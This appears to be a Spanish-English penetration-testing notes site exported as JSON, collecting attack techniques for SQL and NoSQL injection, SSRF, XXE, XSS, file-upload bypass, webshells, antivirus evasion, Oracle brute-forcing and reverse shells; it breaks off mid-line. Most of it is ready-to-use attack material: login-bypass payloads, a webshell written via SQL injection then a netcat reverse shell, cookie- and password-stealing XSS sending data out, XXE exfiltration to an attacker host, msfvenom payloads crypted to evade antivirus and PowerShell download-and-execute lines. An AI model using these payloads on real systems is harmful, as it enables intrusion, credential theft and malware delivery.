Capture and crack NetNTLM hash\n\nthe MSSQL Server service account can be made to initiate a remote\nSMB connection using the command below.\n'+EXEC+master.sys.xp_dirtree+'\\\\10.10.14.9\\share--\n\n\nsi corremos responder en 10.10.14.9 vamos a pegar hashes\n\nSQL filter bypass\n\nBeyond SQLi: Obfuscate and Bypass - https://www.exploit-db.com/papers/17934/\n\nAND, OR operators\nAND = &amp;&amp;\nOR = ||\n\nComment operator « Mysql\n\n--  \t\n#  \n/**/  \n\n\nRetrieving multiple values within a single column STRING CONCATENATION\nIn the preceding example, suppose instead that the query only returns a single column.\n\nYou can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values. For example, on Oracle you could submit the input:\n\n' UNION SELECT username || '~' || password FROM users--\n\nThis uses the double-pipe sequence || which is a string concatenation operator on Oracle. The injected query concatenates together the values of the username and password fields, separated by the ~ character.\n\nExamining the database in SQL injection attacks\n\nORACLE\nOn Oracle, you can obtain the same information with slightly different queries.\n\nYou can list tables by querying all_tables:\n\nSELECT * FROM all_tables\n\nAnd you can list columns by querying all_tab_columns:\n\nSELECT * FROM all_tab_columns WHERE table_name = ‘USERS’\n\nJARVIS CASE BLIND SQLI\n\n\nidentifing\nla detectamos con:\nhttp://jarvis.htb/room.php?cod=6 and 1=1\nhttp://jarvis.htb/room.php?cod=6 and 1=2\n\nenumeration\njarvis.htb/room.php?cod=6 order by 1\njarvis.htb/room.php?cod=6 order by 7\njarvis.htb/room.php?cod=6 order by 8 &gt; error\n\n\n  chequeamos que tipos estan permitidos\n\n\n/room.php?cod=6 UNION SELECT 'a','a','a','a','a','a','a'\n/room.php?cod=6 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL\njarvis.htb/room.php?cod=6 UNION SELECT 1,2,3,4,5,6,7\n\n\n  show results\nusamos -1 para que nos muestre los numeros en otro lado\n    jarvis.htb/room.php?cod=-1 UNION SELECT 1,2,3,4,5,6,7\n    \n    nos muestra 2,3,4,5\n  \n  probamos ver la version en alguno de los campos imprimibles\n    jarvis.htb/room.php?cod=-1 UNION SELECT 1,@@verion,3,4,5,6,7\n    \n  \n  \n    seguimos enumerando\n  \n  user, hostname , db\n\n\nhttp://jarvis.htb/room.php?cod=-1%20UNION%20SELECT%20NULL,@@version,user(),@@hostname,5,6,7\n\nuser = DBadmin@localhost\nhostname = jarvis\ndatabase() = HOTEL\n\n\n\n  schema\n\n\njarvis.htb/room.php?cod=-1 UNION SELECT 1,(select SCHEMA_NAME from Information_Schema.SCHEMATA LIMIT3,1),3,4,5,6,7\n\n\n\n  lfi\n\n\nhttp://jarvis.htb/room.php?cod=-1%20UNION%20SELECT%20NULL,@@version,LOAD_FILE(%22/etc/passwd%22),4,5,NULL,NULL\n\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false\nsystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false\nsystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false\nsystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false\n_apt:x:104:65534::/nonexistent:/bin/false\nmessagebus:x:105:110::/var/run/dbus:/bin/false\npepper:x:1000:1000:,,,:/home/pepper:/bin/bash\nmysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false\nsshd:x:107:65534::/run/sshd:/usr/sbin/nologin\n\n\n\n  lfi 2\n\n\n/var/www/html/index.php\n\n&lt;?php\n          error_reporting(0);\n          include(\"connection.php\");\n          include(\"roomobj.php\");\n          $result=$connection-&gt;query(\"select * from room\");\n          while($line=mysqli_fetch_array($result)){\n            $room=new Room();\n            $room-&gt;cod=$line['cod'];\n            $room-&gt;name=$line['name'];\n            $room-&gt;price=$line['price'];\n            $room-&gt;star=$line['star'];\n            $room-&gt;image=$line['image'];\n            $room-&gt;mini=$line['mini'];\n\n            $room-&gt;printRoom();\n            }\n          ?&gt;\n\n\n  LFI 3\n\n\n/var/www/html/connection.php\n\n$connection=new mysqli('127.0.0.1','DBadmin','imissyou','hotel');\n\n\n\n  Reverse shell\n\n\nla creamos\n\n/room.php?cod=-1 UNION SELECT NULL,1,1,4,\"&lt;?php system($_GET[\\\"cmd\\\"]); ?&gt;\",NULL,NULL into OUTFILE\"/var/www/html/shell3.php\"\n\nla iniciamos\n\n/shell3.php?cmd=nc -nv 10.10.14.6 4444 -e /bin/bash\n\n\nsecond order sqli\n\n\nregistramos cuentas con un sqli por ejemplo\n\nrop' or 2=2 #\n' or 0=0 ​ --\n' or 0=0 #\n' or 0=0 #\"\n' or '1'='1'​ --\n' or 1 ​ --'\n' or 1=1​ --\n' or 1=1 or ''='\n' or 1=1 or \"\"=\n' or a=a​ --\n' or a=a\n') or ('a'='a\n'hi' or 'x'='x';\n\n\ndespues nos logueamos\nrop’ or 2=2 #:password\n\nLogin Bypass:\n\nreplace ‘ with “ if fail\n' or '1'='1  \n' or 1=1;--  \n' or 1=1;#  \n') or ('x'='x  \n' or &lt;column&gt; like '%';--  \n' or 1=1 LIMIT 1;--  \n\nUSERNAME:   ' or 1/*  \nPASSWORD:   */ =1 --  \n\nUSERNAME: admin' or 'a'='a  \nPASSWORD '#  \n\nUSERNAME: admin' --  \nPASSWORD:\n\n\ninject webshell\n\nMysql\n'*'   \n'&amp;'  \n'^'  \n'-'  \n' or true;--   \n' or 1;--  \n\nunion all select \"&lt;?php echo shell_exec($_GET['cmd']);?&gt;\",2,3,4,5,6 into OUTFILE '/var/www/html/shell.php'\n\n\nNoSql\n\n\nlike sql\nselect * from usernames where user='$user';\n\n$user-&gt;findone(array(\n\"username\"=&gt; \"$user\"\n));\n\n\nusuarios que no son iguales ''\nuser-&gt;findone(array(\n\"username\"=&gt; \"{$ne:''}\"\n));\n\n\n\ninjection  php\nurl check if user exist\nusername[$ne]=RandomNoexiste&amp;password[$ne]=noexiste\n\n\ninjection with regex  php\ncheck for 1 char and 4 char usernames\nusername[$regex]=^.{1}&amp;password=noexist\nusername[$regex]=^.{4}&amp;password=noexist\n\n\nnode.js\n\n  change Content-type application/json\n  convert payload to json\n\n\n{\n\"username\": { \"$ne\": \"RandomNOExiste\"},\n\"passowrd\": { \"$ne\": \"ipssec\"},\n\"login\":\"login\"\n}\n\n\n\nAutomated sql injection tools [sqlmap]\n\nbuscar vulnerabilidades\n\nroot@kali: sqlmap -u http:192.168.30.35 --crawl=1\n\nSacando data\nroot@kali:sqlmap -u http://192.168.30.35/comment.php?id=839 --dbms=mysql --dump --threads=5\n\n\notros argumentos:\n\n--os-shell: automatic code execution: os-shel&gt; ipconfig -&gt;succes\n\n\nRESOURCES\n\nhttps://linuxhint.com/blind_sql_injection_tutorial/"
					}

					
				
			
		
			
				
					,
					

					"2-web-ssl": {
						"id": "2-web-ssl",
						"title": "ssl",
						"category": "",
						"url": " /2-web/ssl/",
						"content": "sslyze\nsslyze –regular 10.10.10.22​\n\nssl scan\n\nsslscan tests SSL/TLS enabled services to discover supported cipher suites\n\nhttps://github.com/rbsec/sslscan"
					}

					
				
			
		
			
				
					,
					

					"2-web-ssrf": {
						"id": "2-web-ssrf",
						"title": "ssrf",
						"category": "",
						"url": " /2-web/ssrf/",
						"content": "SSRF\nServer-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker’s choosing.\n\nIn typical SSRF examples, the attacker might cause the server to make a connection back to itself, or to other web-based services within the organization’s infrastructure, or to external third-party systems.\ncommon attacks\nSSRF attacks against the server itself\n. This will typically involve supplying a URL with a hostname like 127.0.0.1 or localhost\n For example, consider a shopping application that lets the user view whether an item is in stock in a particular store. To provide the stock information, the application must query various back-end REST APIs, dependent on the product and store in question. The function is implemented by passing the URL to the relevant back-end API endpoint via a front-end HTTP request. So when a user views the stock status for an item, their browser makes a request like this:\n\n POST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1\n\n\nThis causes the server to make a request to the specified URL, retrieve the stock status, and return this to the user.\n\nIn this situation, an attacker can modify the request to specify a URL local to the server itself. For example:\nPOST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://localhost/admin\n\nHere, the server will fetch the contents of the /admin URL and return it to the user.\n\nSSRF attacks against other back-end systems\nPOST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://192.168.0.68/admin\n\nCircumventing common SSRF defenses\nSSRF with blacklist-based input filters\n Some applications block input containing hostnames like 127.0.0.1 and localhost, or sensitive URLs like /admin. In this situation, you can often circumvent the filter using various techniques:\n\n\n  Using an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1.\n  Registering your own domain name that resolves to 127.0.0.1. You can use spoofed.burpcollaborator.net for this purpose.\n  Obfuscating blocked strings using URL encoding or case variation.\n\n\nSSRF with whitelist-based input filters\n Some applications only allow input that matches, begins with, or contains, a whitelist of permitted values. In this situation, you can sometimes circumvent the filter by exploiting inconsistencies in URL parsing.\n\n\n  You can embed credentials in a URL before the hostname, using the @ character. For example: https://expected-host@evil-host.\n  You can use the # character to indicate a URL fragment. For example: https://evil-host#expected-host.\n  You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: https://expected-host.evil-host.\n  You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.\n  You can use combinations of these techniques together.\n    Change the URL to http://username@stock.weliketoshop.net/ and observe that this is accepted, indicating that the URL parser supports embedded credentials.\nAppend a # to the username and observe that the URL is now rejected.\nDouble-URL encode the # to %2523 and observe the extremely suspicious \"Internal Server Error\" response, indicating that the server may have attempted to connect to \"username\".\nChange the URL to http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos to access the admin interface and delete the target user.\n    \n  \n\n\nBypassing SSRF filters via open redirection\n It is sometimes possible to circumvent any kind of filter-based defenses by exploiting an open redirection vulnerability.\n Provided the API used to make the back-end HTTP request supports redirections, you can construct a URL that satisfies the filter and results in a redirected request to the desired back-end target.\n For example, suppose the application contains an open redirection vulnerability in which the following URL:\n/product/nextProduct?currentProductId=6&amp;path=http://evil-user.net\n\nreturns a redirection to:\n\nhttp://evil-user.net\n\nYou can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability as follows:\nPOST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin\n\n\nblind ssrf\nBlind SSRF vulnerabilities arise when an application can be induced to issue a back-end HTTP request to a supplied URL, but the response from the back-end request is not returned in the application’s front-end response.\n\nBlind SSRF is generally harder to exploit but can sometimes lead to full remote code execution on the server or other back-end components.\n\nThe most reliable way to detect blind SSRF vulnerabilities is using out-of-band (OAST) techniques. This involves attempting to trigger an HTTP request to an external system that you control, and monitoring for network interactions with that system.\n\nSSRF via the Referer header"
					}

					
				
			
		
			
				
					,
					

					"2-web-upload-bypass": {
						"id": "2-web-upload-bypass",
						"title": "upload-bypass",
						"category": "",
						"url": " /2-web/upload-bypass/",
						"content": "UPLOAD BYPASS:\nhttps://www.owasp.org/index.php/Unrestricted_File_Upload\nhttps://soroush.secproject.com/blog/tag/unrestricted-file-upload/\nIIS 6.0 or below\nAsp &gt; upload as test.txt, copy or move file as test.asp;.txt\n\nPhp &gt; upload as pHp / phP / test.php.jpg /\n\nphp - phtml, .php, .php3, .php4, .php5,.php7 and .inc\n\nasp - asp, .aspx\n\nperl - .pl, .pm, .cgi, .lib\n\njsp - .jsp, .jspx, .jsw, .jsv, and .jspf\n\nColdfusion - .cfm, .cfml, .cfc, .dbm\n\n\nimage upload\n\nAs expected, the image gets rejected due to invalid MIME type. The magic bytes for PNG are “89 50 4E 47 0D 0A 1A 0A”, which can be added to the beginning of the shell.\necho '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r &gt; mime.php.png"
					}

					
				
			
		
			
				
					,
					

					"2-web-verb-tampering": {
						"id": "2-web-verb-tampering",
						"title": "verb tampering",
						"category": "",
						"url": " /2-web/verb-tampering/",
						"content": "Verb Tampering\nIt is possible to misconfigure Apache, such that authentication is only requested for a particular\nmethod, leading to a basic authentication bypass. Start Burp and intercept the request to\n/monitoring, then hit Ctrl+R to send it to Repeater. Change the request method to POST and send\nthe request."
					}

					
				
			
		
			
				
					,
					

					"2-web-xee": {
						"id": "2-web-xee",
						"title": "XXE",
						"category": "",
						"url": " /2-web/xee/",
						"content": "XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application’s processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any backend or external systems that the application itself can access.\n\nIn some situations, an attacker can escalate an XXE attack to compromise the underlying server or other backend infrastructure, by leveraging the XXE vulnerability to perform server-side request forgery (SSRF) attacks.\n\ntypes of xxe attacks\n\n\n  retrive files\n  Exploiting XXE to perform SSRF attacks\n  Exploiting blind XXE exfiltrate data out-of-band\n  Exploiting blind XXE to retrieve data via error messages\n\n\nExploiting XXE to retrieve files\n\nmodify the xml in 2 ways:\n\n  Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file.\n  Edit a data value in the XML that is returned in the application’s response, to make use of the defined external entity.\n\n\nFor example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;stockCheck&gt;&lt;productId&gt;381&lt;/productId&gt;&lt;/stockCheck&gt;\n\nyou can exploit it modifing the xml to:\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt; ]&gt;\n&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/stockCheck&gt;\n\n\nThis XXE payload defines an external entity &amp;xxe; whose value is the contents of the /etc/passwd file and uses the entity within the productId value.\n\nnote: With real-world XXE vulnerabilities, there will often be a large number of data values within the submitted XML, any one of which might be used within the application’s response. To test systematically for XXE vulnerabilities, you will generally need to test each data node in the XML individually, by making use of your defined entity and seeing whether it appears within the response.\n\nExploiting XXE to perform SSRF attacks\n\nIn the following XXE example, the external entity will cause the server to make a back-end HTTP request to an internal system within the organization’s infrastructure:\n&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM \"http://internal.vulnerable-website.com/\"&gt; ]&gt;\n\n\nBlind XXE vulnerabilities\n\nExploiting blind XXE to exfiltrate data out-of-band\n\nDetecting a blind XXE vulnerability via out-of-band techniques is all very well, but it doesn’t actually demonstrate how the vulnerability could be exploited. What an attacker really wants to achieve is to exfiltrate sensitive data. This can be achieved via a blind XXE vulnerability, but it involves the attacker hosting a malicious DTD on a system that they control, and then invoking the external DTD from within the in-band XXE payload.\n&lt;!ENTITY % file SYSTEM \"file:///etc/passwd\"&gt;\n&lt;!ENTITY % eval \"&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'&gt;\"&gt;\n%eval;\n%exfiltrate;\n\n\nThe attacker must then host the malicious DTD on a system that they control, normally by loading it onto their own webserver. For example, the attacker might serve the malicious DTD at the following URL:\n\nhttp://web-attacker.com/malicious.dtd\n\nFinally, the attacker must submit the following XXE payload to the vulnerable application:\n&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM\n\"http://web-attacker.com/malicious.dtd\"&gt; %xxe;]&gt;"
					}

					
				
			
		
			
				
					,
					

					"2-web-xss": {
						"id": "2-web-xss",
						"title": "XSS",
						"category": "",
						"url": " /2-web/xss/",
						"content": "There are three main types of XSS attacks. These are:\n\nReflected XSS\nwhere the malicious script comes from the current HTTP request.\nStored XSS\nwhere the malicious script comes from the website’s database.\nDOM-based XSS\nwhere the vulnerability exists in client-side code rather than server-side code.\n\nREFLECTED XSS\n\n\nReflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.\nSuppose a website has a search function which receives the user-supplied search term in a URL parameter:\n\nhttps://insecure-website.com/search?term=gift\n\nThe application echoes the supplied search term in the response to this URL:\n\nYou searched for: gift\nhttps://insecure-website.com/status?message=&lt;script&gt;/*+Bad+stuff+here...+*/&lt;/script&gt;\n\n\nSTORED - aka persistent or second-order XSS\n\n\nStored cross-site scripting  arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.\n\nSuppose a website allows users to submit comments on blog posts, which are displayed to other users. Users submit comments using an HTTP request like the following:\nPOST /post/comment HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 100\n\npostId=3&amp;comment=This+post+was+extremely+helpful.&amp;name=Carlos+Montoya&amp;email=carlos%40normal-user.net\n\nurl encoded with xss:\ncomment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E\n\n\nDOM - Based XSS\n\n\nDOM-based XSS (also known as DOM XSS) arises when an application contains some client-side JavaScript that processes data from an untrusted source in an unsafe way, usually by writing the data to a potentially dangerous sink within the DOM.\n\nsource: A source is a JavaScript property that contains data that an attacker could potentially control. An example of a source is location.search, which reads input from the query string.\n\nsink: A sink is a function or DOM object that allows JavaScript code execution or rendering of HTML. An example of a code execution sink is eval, and an example of an HTML sink is document.body.innerHTML.\n\nIn principle, an application is vulnerable to DOM-based cross-site scripting if there is an executable path via which data can propagate from source to sink. In practice, different sources and sinks have differing properties and behavior that can affect exploitability, and determine what techniques are necessary. Additionally, the application’s scripts might perform validation or other processing of data that must be accommodated when attempting to exploit a vulnerability. There are a variety of sources and sinks that are relevant to DOM-based vulnerabilities.\n\nThe document.write sink works with script elements, so you can use a simple payload such as:\ndocument.write('... &lt;script&gt;alert(document.domain)&lt;/script&gt; ...');\n\n\nThe innerHTML sink doesn’t accept script elements on any modern browser, nor will svg onload events fire. This means you will need to use alternative elements like img or iframe. Event handlers such as onload and onerror can be used in conjunction with these elements. For example:\nelement.innerHTML='... &lt;img src=1 onerror=alert(document.domain)&gt; ...'\n\n\nCONTEXT\n\nWhen testing for reflected and stored XSS, a key task is to identify the XSS context:\n\nThe location within the response where attacker-controllable data appears.\nAny input validation or other processing that is being performed on that data by the application.\n\nXSS between html tags\n&lt;script&gt;alert(document.domain)&lt;/script&gt;\n&lt;img src=1 onerror=alert(1)&gt;\n\n\nxss in html tag attributes\nWhen the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. For example:\n\"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;\n\n\nMore commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example:\n\" autofocus onfocus=alert(document.domain) x=\"\n\n\n&lt;a href=\"javascript:alert(document.domain)\"&gt;\n\n\nxss in javascript\n\nTerminating the existing script\nIn the simplest case, it is possible to simply close the script tag that is enclosing the existing JavaScript, and introduce some new HTML tags that will trigger execution of JavaScript. For example, if the XSS context is as follows:\n\n&lt;/script&gt;&lt;img src=1 onerror=alert(document.domain)&gt;\n\nBreaking out of a JavaScript string\n'-alert(document.domain)-'\n';alert(document.domain)//\n\n\nMaking use of HTML-encoding\n\nWhen the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters.\nFor example, if the XSS context is as follows:\n&lt;a href=\"#\" onclick=\"... var input='controllable data here'; ...\"&gt;\n\nand the application blocks or escapes single quote characters, you can use the following payload to break out of the JavaScript string and execute your own script:\n&amp;apos;-alert(document.domain)-&amp;apos;\n\nThe ' sequence is an HTML entity representing an apostrophe or single quote\n\nXSS in JavaScript template literals\nJavaScript template literals are string literals that allow embedded JavaScript expressions. The embedded expressions are evaluated and are normally concatenated into the surrounding text. Template literals are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the ${…} syntax.\n\nFor example, the following script will print a welcome message that includes the user’s display name:\n\ndocument.getElementById(‘message’).innerText = Welcome, ${user.displayName}.;\n\nWhen the XSS context is into a JavaScript template literal, there is no need to terminate the literal. Instead, you simply need to use the ${…} syntax to embed a JavaScript expression that will be executed when the literal is processed. For example, if the XSS context is as follows:\n&lt;script&gt;\n...\nvar input = `controllable data here`;\n...\n&lt;/script&gt;\n\nthen you can use the following payload to execute JavaScript without terminating the template literal:\n${alert(document.domain)}\n\n\nEXPLOITING\n\nsteal cookies\n&lt;script&gt;\nnew Image().src=\"http://192.168.30.5:81/bogus.php?ouput=\"+document.cookie;\n&lt;/script&gt;\n\n&lt;script&gt;\nfetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {\nmethod: 'POST',\nmode: 'no-cors',\nbody:document.cookie\n});\n&lt;/script&gt;\n\n\ncapture passwords\n&lt;input name=username id=username&gt;\n&lt;input type=password name=password onchange=\"if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{\nmethod:'POST',\nmode: 'no-cors',\nbody:username.value+':'+this.value\n});\"&gt;"
					}

					
				
			
		
			
				
					,
					

					"3-exploiting-1-webshells": {
						"id": "3-exploiting-1-webshells",
						"title": "webshells",
						"category": "",
						"url": " /3-Exploiting/1-webshells/",
						"content": "1 full webshells\n\nWeevely\ngenera webshells\nweevely generate password /tmp/payload.php\n\ndespues lo llamamos con :\nweevely http://192.168.1.2/location_of_payload password\n\nkali\n\n/usr/share/webshells/\n\n\n2 lite webshells\n\n\nPHP web shells\n&lt;?php system($_GET[\"cmd\"]); ?&gt;\n\n\n&lt;?php echo shell_exec($_GET['cmd']); ?&gt;\n\n&lt;? passthru($_GET[\"cmd\"]); ?&gt;\n\n\nphp with upload\n&lt;?php\n if (isset($_REQUEST['fupload'])) {\n  file_put_contents($_REQUEST['fupload'], file_get_contents(\"http://yourIP/\" . $_REQUEST['fupload']));\n };\n if (isset($_REQUEST['cmd'])) {\n  echo \"&lt;pre&gt;\" . shell_exec($_REQUEST['cmd']) . \"&lt;/pre&gt;\";\n }\n?&gt;\n\nthen the above can be accessed by\ncurl  http://IP/shell.php?fupload=filename_on_your_webserver\n\n\nif running whoami we get the error:  ‘standard in must be a tty’ we can try:\n(sleep 1; echo password) | python -c \"import pty; pty.spawn(['/bin/su','-c','whoami']);\""
					}

					
				
			
		
			
				
					,
					

					"3-exploiting-2-shellcodes-compiling-deploying": {
						"id": "3-exploiting-2-shellcodes-compiling-deploying",
						"title": "shellcodes , compiling and deploying",
						"category": "",
						"url": " /3-Exploiting/2-shellcodes-compiling-deploying/",
						"content": "Autosploit\nTODO\n\nCompilando para windows en linux\n\n\ninstall\napt-get install mingw-w64\n\n\ncompile\nx86_64-w64-mingw32-gcc exploit.c -o nop.exe  # 64bits\ni686-w64-mingw32-gcc exploit.c -o nop.exe    -lws2_32 # 32bits\n\n\nCross compiling\n\ngcc -m32 -o output32 hello.c (32 bit)\ngcc -m32 -o output32 hello.c (32 bit)\ngcc -m64 -o output hello.c (64 bit)\n\n\nVISUAL CODE\n\ncuando un projecto tiene algun archivo vcproj o vcxproj, sln los podes compilar con visual studio\n\ndescarga:\nMicrosoft Visual Studio 2008 Service Pack 1 (iso)\n\nhttp://www.microsoft.com/en-us/download/details.aspx?id=13276\n\nhttp://download.microsoft.com/download/a/3/7/a371b6d1-fc5e-44f7-914c-cb452b4043a9/VS2008SP1ENUX1512962.iso\n\n\nCompile python script to .exe\n\npip install pyinstaller\nwget -O exploit.py http://www.exploit-db.com/download/31853  \npython pyinstaller.py --onefile exploit.py"
					}

					
				
			
		
			
				
					,
					

					"3-exploiting-3-bypassing-av": {
						"id": "3-exploiting-3-bypassing-av",
						"title": "bypassing AV",
						"category": "",
						"url": " /3-Exploiting/3-bypassing-AV/",
						"content": "1 BYPASSING ANTIVIRUS\n\n\ncambiamos la estructura binaria para que cambie la firma y los antivirus no lo vean\n\nOpcion 1 usamos un encoder\n  msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe\n\n\nOpcion 2 Lo embebemos en un ejecutable no malicioso\n   msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe -e x86/shikata_ga_nai -i  9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe\n\n\nOpcion 3 Encriptarlo\n\nelegimos el payload embebido y encodeado lo copiamos a un lugar y usamos hyperion\n  root@kali: cp shell_reverse_msf_encoded_embedded.exe backdoor.exe\n  root@kali: cp /usr/share/windows-binaries/hyperion-1.0.zip .\n  root@kali: unzip Hyperion.zip\n  root@kali: cd HYperion\n  root@kali:hyperion# i686-w64-mingw32-g++ Src/Crypter/*.cpp -o hyperion.exe\n  root@kali:hyperion# cp -p /usr/lib/gcc/i686-w64-mingnw32/6.1-win32/libgc_s_sjlj-1.dll .\n  root@kali:hyperion# cp -p /usr/lib/gcc/i686-w64-mingw32/6.1-win32/libstdc++-6.dll .\n  root@kali: wine hyperion.exe ../backdor.exe ../crypted.exe\n\n\nopcion 4 ideal:\nArmar uno a manopla idem con payloads\n\notros\nhttps://github.com/secretsquirrel/the-backdoor-factory\nhttps://www.veil-framework.com/\n\n\nSHELTER\n\nlo instalamos en kali le pasamos un binario y le mete un payload que queramos."
					}

					
				
			
		
			
				
					,
					

					"3-exploiting-4-databases": {
						"id": "3-exploiting-4-databases",
						"title": "databases",
						"category": "",
						"url": " /3-Exploiting/4-databases/",
						"content": "ORACLE\n\nclii tool\nsqlplus64 scott/tiger@10.10.10.10:1521/XE as sysdba\n\nodat\nodat all -s 10.10.10.82 -p 1521\nodat passwordguesser –accounts-file /root/tools/SecLists/Passwords/Default-Credentials/oracle-betterdefaultpasslist.txt  -s 10.10.10.82 -p 1521 -d XE\n\nupload file with odat\nodat utlfile -s 10.10.10.82 -U scott -P tigger -d XE  –sysdba –putFile c:\\windows\\temp shell.exe shell.exe\n\nexecute file\nodat externaltable -s 10.10.10.82 -U scott -P tiger -d XE –sysdba –exec c:/ shell.exe\n\nhydra\npodemos usar hydra para bruteforcear el passowrd del tnslistener si es que tien\n./hydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listener\n\ntmb para bruteforcear SIDs\n./hydra -L /usr/share/oscanner/lib/services.txt -s 1521 host.victim oracle-sid\n\nbruteforcear account\n./hydra -L /tmp/user.txt -P /tmp/pass.txt -s 1521 host.victim oracle /PLSEXTPROC\n\noscanner\noscanner -s 192.168.1.18\n\nsqlplus\npara loguearse a una db remota\nsqlplus /@/;\n\nsi tiene sysdba\nsqlplus /@/ 'as sysdba';\n\nMySQL\n\n\nMSSQL\n\n\nPostgres\n\n\nMONGO"
					}

					
				
			
		
			
				
					,
					

					"3-exploiting-6-reverse-shells": {
						"id": "3-exploiting-6-reverse-shells",
						"title": "Reverse Shells",
						"category": "",
						"url": " /3-Exploiting/6-reverse-shells/",
						"content": "ncat\n\n\n  hacker:\n    root@kali: nc -nlvp 666\nor\nroot@kali:  rlwrap nc -nlvp 666\n    \n  \n  target:\n    gil@ubuntu: nc -nv 10.10.0.25 666 -e /bin/bash\n    \n    c:&gt; nc.exe 192.168.100.113 4444 –e cmd.exe\n    \n  \n  If you have the wrong version of netcat installed, try\n\n\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc attackerip &gt;/tmp/f\n\n\npowershell\noptions\n\n  -NoP , -noprofile: No carga el windows profile\n  -noni, -NonInteractive : asegura que sea no interactiva\n  -Exec Bypass, -ExecutionPolicy Bypass:  will not block the execution of any scripts or create any prompts\n  -W Hidden: prevent powershell from displaying a window\n*\n\n\nshells\n\n\n  desde url\n    con invoke-powershell modificado, agregando los datos al final del script\nshell.php?cmd=echo IEX(New-Object System.Net.WebClient).downloadString('http://10.10.14.6/Invoke-PowerShellTcp.ps1') | powershell -noprofile -ep bypass\n    \n  \n  desde prompt\n    powershell -NoP -W Hidden -Exec Bypass -c \"iex New-Object Net.WebClient).DownloadString('http://10.10.14.6/Invoke-PowerShellTcp.ps1')\";Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.6 -Port 666\n    \n  \n  run 64bits powershell\n    %SystemRoot%\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe\n    \n  \n\n\npython\ntcp\nimport 